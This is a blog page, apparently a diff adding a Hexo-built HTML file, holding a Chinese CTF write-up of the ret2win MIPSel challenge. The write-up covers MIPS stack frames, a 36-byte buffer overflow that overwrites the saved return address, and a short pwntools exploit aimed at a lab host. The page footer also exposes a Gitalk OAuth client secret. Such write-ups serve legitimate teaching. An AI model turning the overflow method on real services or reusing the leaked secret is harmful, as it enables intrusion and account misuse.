@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"oneshell.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="开始做第一个题目：ret2win。 MIPS指令基本分析首先简单对MIPS程序的指令进行分析。 函数初始化过程：  首先是开辟栈帧，通过给sp寄存器加上一个负数的方式，来开辟栈帧空间。 保存ra寄存器到栈上，即将函数执行完毕后的返回地址到本函数的栈上，因为本函数如果调用了子函数，ra寄存器会被使用。 保存fp寄存器到栈上，fp中保存了上一个函数的栈顶，也就是上一个函数的sp。 将当前的栈顶sp保存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2win_mipsel">
+<meta property="og:url" content="https://oneshell.top/2023/03/15/ret2win_mipsel/index.html">
+<meta property="og:site_name" content="OneShell">
+<meta property="og:description" content="开始做第一个题目：ret2win。 MIPS指令基本分析首先简单对MIPS程序的指令进行分析。 函数初始化过程：  首先是开辟栈帧，通过给sp寄存器加上一个负数的方式，来开辟栈帧空间。 保存ra寄存器到栈上，即将函数执行完毕后的返回地址到本函数的栈上，因为本函数如果调用了子函数，ra寄存器会被使用。 保存fp寄存器到栈上，fp中保存了上一个函数的栈顶，也就是上一个函数的sp。 将当前的栈顶sp保存">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-03-15T02:11:03.000Z">
+<meta property="article:modified_time" content="2023-03-31T08:41:12.621Z">
+<meta property="article:author" content="OneShell">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://oneshell.top/2023/03/15/ret2win_mipsel/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>ret2win_mipsel | OneShell</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">OneShell</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">blog of oneshell</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/ret2win_mipsel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="stay hungry, stay foolish">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2win_mipsel
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-15 10:11:03" itemprop="dateCreated datePublished" datetime="2023-03-15T10:11:03+08:00">2023-03-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-31 16:41:12" itemprop="dateModified" datetime="2023-03-31T16:41:12+08:00">2023-03-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>开始做第一个题目：ret2win。</p>
+<h2 id="MIPS指令基本分析"><a href="#MIPS指令基本分析" class="headerlink" title="MIPS指令基本分析"></a>MIPS指令基本分析</h2><p>首先简单对MIPS程序的指令进行分析。</p>
+<p>函数初始化过程：</p>
+<ul>
+<li>首先是开辟栈帧，通过给sp寄存器加上一个负数的方式，来开辟栈帧空间。</li>
+<li>保存ra寄存器到栈上，即将函数执行完毕后的返回地址到本函数的栈上，因为本函数如果调用了子函数，ra寄存器会被使用。</li>
+<li>保存fp寄存器到栈上，fp中保存了上一个函数的栈顶，也就是上一个函数的sp。</li>
+<li>将当前的栈顶sp保存到fp中，现在不是很能说清楚这个操作的含义，可能是用来在调用子函数的时候，恢复本函数的栈顶</li>
+<li>读取GOT上的偏移到gp中，然后将gp的值保存到栈上。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00400830 addiu   $sp, -0x20       # 开辟栈帧</span><br><span class="line">.text:00400834 sw      $ra, 0x18+var_s4($sp)  # 保存函数返回地址到栈上</span><br><span class="line">.text:00400838 sw      $fp, 0x18+var_s0($sp)  # 保存栈帧寄存器到栈上</span><br><span class="line">.text:0040083C move    $fp, $sp  </span><br><span class="line">.text:00400840 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:00400848 sw      $gp, 0x18+var_8($sp)  # 将gp也保存到了栈上</span><br></pre></td></tr></table></figure>
+对于ra寄存器，是用来保存返回地址的（return address），在MIPS的缓冲区溢出中，需要通过溢出修改掉在函数初始化时保存在栈上的ra寄存器值。等函数执行完毕之后，就从栈上恢复值到ra寄存器，并跳转执行。意思就是，MIPS架构中劫持ra寄存器是劫持控制流的关键。</li>
+</ul>
+<p>函数的退出过程：</p>
+<ul>
+<li>从栈上恢复先前保存的gp</li>
+<li>给v0寄存器赋值0，v0和v1寄存器一般用来保存函数的返回值</li>
+<li>将fp赋值给sp，但是在本函数中没有操作sp和fp，因此，sp&#x3D;sp没有发生变化</li>
+<li>从栈上恢复ra和fp，也就是恢复函数返回地址、上一个函数的fp</li>
+<li>恢复栈帧，实现堆栈平衡</li>
+<li>跳转到ra，也就是函数返回地址，随后的一个nop指令是指令延迟槽，会被执行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:004008D4 lw      $gp, 0x18+var_8($fp)</span><br><span class="line">.text:004008D8 move    $v0, $zero</span><br><span class="line">.text:004008DC move    $sp, $fp</span><br><span class="line">.text:004008E0 lw      $ra, 0x18+var_s4($sp)</span><br><span class="line">.text:004008E4 lw      $fp, 0x18+var_s0($sp)</span><br><span class="line">.text:004008E8 addiu   $sp, 0x20</span><br><span class="line">.text:004008EC jr      $ra</span><br><span class="line">.text:004008F0 nop</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>一个函数跳转的实现：</p>
+<ul>
+<li>MIPS架构中，小于等于4个参数使用寄存器a0~a3进行参数传递</li>
+<li>在调用setvbuf时，先将函数地址赋值给v0，然后再赋值给t9，最后jalr跳转到函数执行</li>
+<li>jalr跳转指令下还有一个nop指令，这个指令是MIPS的分支延迟槽，分支延迟槽和MIPS的流水线相关，此处不展开细说，大概就是分支（b指令）和跳转（j指令）后的一条指令会随着分支和跳转指令执行完毕后自动执行。分支延迟槽也通常被用于设置一个函数传参，例如就可以把li $a2, 2这条指令放到分支延迟槽中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00400854 move    $a3, $zero       # n</span><br><span class="line">.text:00400858 li      $a2, 2           # modes</span><br><span class="line">.text:0040085C move    $a1, $zero       # buf</span><br><span class="line">.text:00400860 move    $a0, $v0         # stream</span><br><span class="line">.text:00400864 la      $v0, setvbuf</span><br><span class="line">.text:00400868 move    $t9, $v0</span><br><span class="line">.text:0040086C jalr    $t9 ; setvbuf</span><br><span class="line">.text:00400870 nop</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>缓冲区起始地址sp+18h，ra保存在sp+3ch，因此，填充24h&#x3D;36字节，随后的4个字节数据便可以覆盖掉函数返回地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:004008F8 sw      $ra, 0x38+var_s4($sp)</span><br></pre></td></tr></table></figure>
+<p>构造字符串如下，便可以覆盖掉返回地址为：dead</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaadead</span><br><span class="line">*PC   0x64616564 (&#x27;dead&#x27;)</span><br></pre></td></tr></table></figure>
+<p>通过搜索字符串，可以看到有一个函数ret2win提供了输入flag的命令，那么ROP跳转过去即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret2win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./ret2win_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">36</span></span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&quot;ret2win&quot;</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;raw&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(rop)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> p.recvlines(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> re.findall(<span class="string">&quot;ROPE&quot;</span>, <span class="built_in">str</span>(each)):</span><br><span class="line">        flag = each</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/13/gdb%E6%B7%BB%E5%8A%A0%E8%B0%83%E8%AF%95%E7%AC%A6%E5%8F%B7/" rel="prev" title="gdb添加调试符号">
+      <i class="fa fa-chevron-left"></i> gdb添加调试符号
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0-%E8%AF%BB%E5%8F%96K2P%E7%9A%84SPI%20flash/" rel="next" title="树莓派折腾日记-读取K2P的SPI flash">
+      树莓派折腾日记-读取K2P的SPI flash <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPS%E6%8C%87%E4%BB%A4%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">MIPS指令基本分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">OneShell</p>
+  <div class="site-description" itemprop="description">stay hungry, stay foolish</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">OneShell</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'd364449d44c374dab007',
+      clientSecret: 'bb821aa84a81e3bd904d059c6e9ec7eb0e1cab4f',
+      repo        : 'BlogComments',
+      owner       : 'NoneShell',
+      admin       : ['NoneShell'],
+      id          : 'fb934093d4e12bc189d21d1215bdccc7',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
